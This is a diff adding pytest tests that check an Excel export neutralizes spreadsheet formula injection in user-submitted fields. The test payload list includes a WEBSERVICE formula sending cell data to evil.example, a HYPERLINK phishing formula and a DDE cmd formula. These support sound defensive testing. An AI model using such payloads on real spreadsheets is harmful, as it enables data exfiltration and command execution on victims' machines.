@@ -285,3 +285,85 @@ class TestExportBasename:
         base = ex.export_basename(1, "sumar")
         # _safe_filename keeps spaces (regex [^\w\- ]+), so "BizCheck Pro" survives.
         assert base.startswith("Виписка_sumar_BizCheck Pro_")
+
+
+# ---------------------------------------------------------------------------
+# CSV / Excel formula injection (CWE-1236)
+# ---------------------------------------------------------------------------
+# `sector`, `company_size`, `company_age` and `company_revenue` are written by
+# the PUBLIC PATCH /submissions/{id} (the submission_token is handed out by the
+# equally public POST). They are sanitized with clean_text — which strips HTML
+# but has no reason to care about spreadsheet syntax — and there is no
+# allow-list behind the UI dropdown, so an attacker controls the exact string.
+#
+# openpyxl types a string starting with "=" as a FORMULA cell (data_type "f"),
+# so that string becomes live code in the workbook the admin downloads:
+# =HYPERLINK(...) to phish, =WEBSERVICE(...) to exfiltrate the sheet, or the
+# classic =cmd|'/c ...'!A0 DDE prompt. Neutralize at the single serialization
+# choke point every export goes through.
+
+class TestFormulaInjection:
+
+    _PAYLOADS = [
+        '=HYPERLINK("http://evil.example/?"&A1,"Click me")',
+        "=1+1",
+        '=WEBSERVICE("http://evil.example/"&A1)',
+        "=cmd|'/c calc'!A0",
+    ]
+
+    def _roundtrip(self, values):
+        wb = openpyxl.Workbook()
+        ws = wb.active
+        ws.append(values)
+        data = ex.workbook_to_bytes(wb)
+        from io import BytesIO
+        return openpyxl.load_workbook(BytesIO(data)).active
+
+    @pytest.mark.parametrize("payload", _PAYLOADS)
+    def test_leading_equals_is_not_written_as_a_formula(self, payload):
+        ws = self._roundtrip([payload])
+        cell = ws.cell(row=1, column=1)
+        assert cell.data_type != "f", f"{payload!r} was written as a live formula"
+        assert cell.value == payload, "the text must still be readable verbatim"
+
+    def test_no_formula_element_reaches_the_xlsx(self):
+        import zipfile
+        from io import BytesIO
+        wb = openpyxl.Workbook()
+        wb.active.append(self._PAYLOADS)
+        data = ex.workbook_to_bytes(wb)
+        sheet = zipfile.ZipFile(BytesIO(data)).read("xl/worksheets/sheet1.xml").decode()
+        assert "<f>" not in sheet
+
+    def test_normal_values_keep_their_types(self):
+        ws = self._roundtrip(["IT / Цифрові сервіси", 42, 87.5, None])
+        assert ws.cell(row=1, column=1).value == "IT / Цифрові сервіси"
+        assert ws.cell(row=1, column=2).value == 42          # still numeric
+        assert ws.cell(row=1, column=2).data_type == "n"
+        assert ws.cell(row=1, column=3).value == 87.5
+        assert ws.cell(row=1, column=3).data_type == "n"
+
+    def test_a_submission_sector_is_neutralized_end_to_end(self, monkeypatch, patch_models):
+        """The payload travels the real builder, not a hand-made sheet."""
+        from io import BytesIO
+        monkeypatch.setattr(
+            ex.Submission, "find_all",
+            staticmethod(lambda **kw: [{
+                "id": 1, "first_name": "A", "last_name": "B",
+                "email": "a@b.c", "phone": "", "status": "completed",
+                "sector": '=HYPERLINK("http://evil.example","x")',
+                "company_size": "=1+1", "created_at": datetime(2024, 1, 1),
+                "total_score": 50, "answers_json": None,
+                "block_scores_json": None, "test_id": 1,
+            }]),
+        )
+        wb = ex.build_all_submissions_workbook()
+        book = openpyxl.load_workbook(BytesIO(ex.workbook_to_bytes(wb)))
+        found = 0
+        for ws in book.worksheets:
+            for row in ws.iter_rows():
+                for c in row:
+                    if isinstance(c.value, str) and c.value.startswith("="):
+                        found += 1
+                        assert c.data_type != "f", f"live formula in {ws.title}!{c.coordinate}"
+        assert found >= 1, "the payload never reached the workbook"
